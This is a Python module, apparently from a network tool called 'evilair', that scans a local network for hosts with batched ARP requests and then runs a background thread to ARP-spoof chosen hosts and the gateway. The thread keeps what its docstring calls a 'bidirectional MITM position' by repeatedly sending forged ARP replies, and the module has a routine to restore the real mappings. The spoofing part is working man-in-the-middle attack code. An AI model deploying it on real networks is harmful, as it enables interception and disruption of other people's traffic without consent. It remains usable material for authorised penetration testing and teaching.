"""ARP discovery and ARP spoofing.

The scanner sends batched ARP requests (a handful of packets instead of one per
address), which is orders of magnitude faster than probing hosts one by one.
"""

from __future__ import annotations

import logging
import threading
from typing import Iterable, Iterator

from evilair.core.host import Host
from evilair.util.rate import format_mac

LOGGER = logging.getLogger("evilair.arp")
BROADCAST = "ff:ff:ff:ff:ff:ff"


def _scapy():
    from scapy.all import ARP, Ether  # noqa: PLC0415 - heavy optional import

    return ARP, Ether


def get_if_hwaddr(interface: str) -> str:
    from scapy.all import get_if_hwaddr as scapy_get_if_hwaddr  # noqa: PLC0415

    return format_mac(scapy_get_if_hwaddr(interface))


def _chunks(items: list[str], size: int) -> Iterator[list[str]]:
    for index in range(0, len(items), size):
        yield items[index : index + size]


class ARPScanner:
    """Discovers live hosts on the local segment."""

    def __init__(
        self,
        interface: str,
        timeout: float = 1.5,
        retries: int = 2,
        batch_size: int = 200,
    ) -> None:
        self.interface = interface
        self.timeout = timeout
        self.retries = retries
        self.batch_size = batch_size

    def scan(self, targets: Iterable[str], resolve_names: bool = True) -> list[Host]:
        addresses = [str(target) for target in targets]
        if not addresses:
            return []

        hosts = self._arp_scan(addresses)
        if resolve_names:
            resolve_names_for(hosts)
        return sorted(hosts, key=lambda host: tuple(int(part) for part in host.ip.split(".")))

    def _arp_scan(self, addresses: list[str]) -> list[Host]:
        ARP, Ether = _scapy()
        from scapy.all import srp  # noqa: PLC0415

        source_mac = get_if_hwaddr(self.interface)
        discovered: dict[str, Host] = {}

        for batch in _chunks(addresses, self.batch_size):
            packet = Ether(src=source_mac, dst=BROADCAST) / ARP(op="who-has", pdst=batch)
            answered, _ = srp(
                packet,
                iface=self.interface,
                timeout=self.timeout,
                retry=self.retries,
                verbose=0,
                filter=None,
            )
            for _, response in answered:
                try:
                    mac = format_mac(response.hwsrc)
                except ValueError:
                    continue
                discovered[response.psrc] = Host(ip=response.psrc, mac=mac)

        return list(discovered.values())

    def scan_from_cache(self, network_hosts: Iterable[str]) -> list[Host]:
        """Root-free fallback: read the kernel neighbour table."""
        from evilair.net.iface import neighbour_table  # noqa: PLC0415 - avoid cycle

        wanted = set(network_hosts)
        return [
            Host(ip=ip, mac=mac)
            for ip, mac in neighbour_table().items()
            if ip in wanted
        ]


def resolve_names_for(hosts: list[Host], timeout: float = 0.75) -> None:
    """Resolve hostnames concurrently; failures are silent by design."""
    from concurrent.futures import ThreadPoolExecutor  # noqa: PLC0415

    from evilair.net.iface import reverse_dns  # noqa: PLC0415

    if not hosts:
        return

    with ThreadPoolExecutor(max_workers=min(32, len(hosts))) as pool:
        names = list(pool.map(lambda host: reverse_dns(host.ip, timeout), hosts))
    for host, name in zip(hosts, names):
        host.name = name


class ARPSpoofer(threading.Thread):
    """Keeps a bidirectional MITM position for the managed hosts."""

    def __init__(
        self,
        interface: str,
        gateway_ip: str,
        gateway_mac: str,
        interval: float = 2.0,
    ) -> None:
        super().__init__(name="evilair-spoofer", daemon=True)
        self.interface = interface
        self.gateway_ip = gateway_ip
        self.gateway_mac = format_mac(gateway_mac)
        self.interval = interval

        self._hosts: dict[str, Host] = {}
        self._lock = threading.Lock()
        self._stop = threading.Event()

    # -- public API -------------------------------------------------------
    def add(self, host: Host) -> None:
        with self._lock:
            self._hosts[host.ip] = host
        host.spoofed = True
        self._send_pair(host)

    def remove(self, host: Host, restore: bool = True) -> None:
        with self._lock:
            self._hosts.pop(host.ip, None)
        if restore:
            self._restore(host)
        host.spoofed = False

    def stop(self) -> None:
        self._stop.set()

    def restore_all(self) -> None:
        with self._lock:
            hosts = list(self._hosts.values())
            self._hosts.clear()
        for host in hosts:
            try:
                self._restore(host)
            except Exception as exc:  # pragma: no cover - network dependent
                LOGGER.warning("could not restore %s: %s", host.ip, exc)
            host.spoofed = False

    @property
    def targets(self) -> list[Host]:
        with self._lock:
            return list(self._hosts.values())

    # -- thread -----------------------------------------------------------
    def run(self) -> None:
        while not self._stop.wait(self.interval):
            with self._lock:
                hosts = list(self._hosts.values())
            for host in hosts:
                if self._stop.is_set():
                    return
                try:
                    self._send_pair(host)
                except Exception as exc:  # pragma: no cover - network dependent
                    LOGGER.debug("spoofing %s failed: %s", host.ip, exc)

    # -- packets ----------------------------------------------------------
    def _frames(self, host: Host):
        ARP, Ether = _scapy()
        source_mac = get_if_hwaddr(self.interface)
        return [
            Ether(src=source_mac, dst=self.gateway_mac)
            / ARP(op="is-at", hwsrc=source_mac, psrc=host.ip, hwdst=self.gateway_mac, pdst=self.gateway_ip),
            Ether(src=source_mac, dst=host.mac)
            / ARP(op="is-at", hwsrc=source_mac, psrc=self.gateway_ip, hwdst=host.mac, pdst=host.ip),
        ]

    def _send_pair(self, host: Host) -> None:
        from scapy.all import sendp  # noqa: PLC0415

        sendp(self._frames(host), iface=self.interface, verbose=0)

    def _restore(self, host: Host) -> None:
        ARP, Ether = _scapy()
        from scapy.all import sendp  # noqa: PLC0415

        frames = [
            Ether(src=host.mac, dst=BROADCAST)
            / ARP(op="is-at", hwsrc=host.mac, psrc=host.ip, hwdst=BROADCAST, pdst=self.gateway_ip),
            Ether(src=self.gateway_mac, dst=BROADCAST)
            / ARP(op="is-at", hwsrc=self.gateway_mac, psrc=self.gateway_ip, hwdst=BROADCAST, pdst=host.ip),
        ]
        sendp(frames, iface=self.interface, verbose=0, count=3)
